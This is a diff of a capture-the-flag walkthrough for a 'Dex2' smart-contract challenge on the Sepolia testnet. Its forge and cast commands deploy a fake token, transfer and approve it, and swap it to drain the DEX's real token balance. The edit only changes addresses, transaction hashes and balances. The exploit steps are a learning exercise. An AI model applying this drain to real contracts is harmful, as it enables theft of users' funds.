@@ -39,10 +39,10 @@ According to the formula in `get_swap_amount()`, to get all the token2 from the 
 ```bash
 forge script script/DeployDex2AttackToken.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
 
-# https://sepolia.etherscan.io/address/0x659BFCd93A970941C49d54591A117d75042281A6
+# https://sepolia.etherscan.io/address/0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed
 
-# At $CONTRACT_ADDRESS=0x659BFCd93A970941C49d54591A117d75042281A6
-# balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 400
+# At $CONTRACT_ADDRESS=0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed
+# balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 300
 ```
 
 2. Send 100 BTN from `Dex2AttackToken` to `Dex2`.
@@ -50,15 +50,15 @@ forge script script/DeployDex2AttackToken.s.sol --rpc-url $ALCHEMY_RPC_URL --pri
 ```bash
 cast send $CONTRACT_ADDRESS "transfer(address,uint256)" $DEX2_ADDRESS 100 --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --legacy
 
-# https://sepolia.etherscan.io/tx/0xaa361215bdf3f8756b8d9646da8a6eba68d36ed4ff9db451fa3f336effbbf209
+# https://sepolia.etherscan.io/tx/0x74dc9b1123d966fd2e41651ff32bb91375b20b4d83d2732457971004b0c446ac
 
-# At $CONTRACT_ADDRESS=0x659BFCd93A970941C49d54591A117d75042281A6
+# At $CONTRACT_ADDRESS=0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed
 # balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 0
 
-# At $DEX2_ADDRESS=0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
+# At $DEX2_ADDRESS=0x97e3Bc8E0A6f8550ea7BECcE9aC618f5a438C5F9
 # balanceOF
-# token address (BTN): 0x659BFCd93A970941C49d54591A117d75042281A6
-# Dex2 contract address (DEX2_ADDRESS) : 0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
+# token address (BTN): 0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed
+# Dex2 contract address (DEX2_ADDRESS) : 0x97e3Bc8E0A6f8550ea7BECcE9aC618f5a438C5F9
 # equals 300
 ```
 
@@ -67,7 +67,7 @@ cast send $CONTRACT_ADDRESS "transfer(address,uint256)" $DEX2_ADDRESS 100 --rpc-
 ```bash
 cast send $CONTRACT_ADDRESS "approve(address,uint256)" $DEX2_ADDRESS 300 --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
 
-# https://sepolia.etherscan.io/tx/0xa134cdb28083dc2ec49789336be65724241aacf9c095312ca60956d3e671717c
+# https://sepolia.etherscan.io/tx/0x9dc038eea6c20bf9ae126fb394bebf8c19180aab05152add84124babe09f5a96
 ```
 
 4. Execute the swap of both tokens.
@@ -75,10 +75,10 @@ cast send $CONTRACT_ADDRESS "approve(address,uint256)" $DEX2_ADDRESS 300 --priva
 ```bash
 forge script script/DeployDex2AttackSwap.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
 
-# At $DEX2_ADDRESS=0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
+# At $DEX2_ADDRESS=0x97e3Bc8E0A6f8550ea7BECcE9aC618f5a438C5F9
 # balanceOF
-# token address (BTN): 0x659BFCd93A970941C49d54591A117d75042281A6
-# Dex2 contract address (DEX2_ADDRESS) : 0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf
+# token address (BTN): 0xE3B0bd9d2bd8E3B189E76eFcB6B8598B8d9495Ed
+# Dex2 contract address (DEX2_ADDRESS) : 0x97e3Bc8E0A6f8550ea7BECcE9aC618f5a438C5F9
 # equals 300
 ```
 
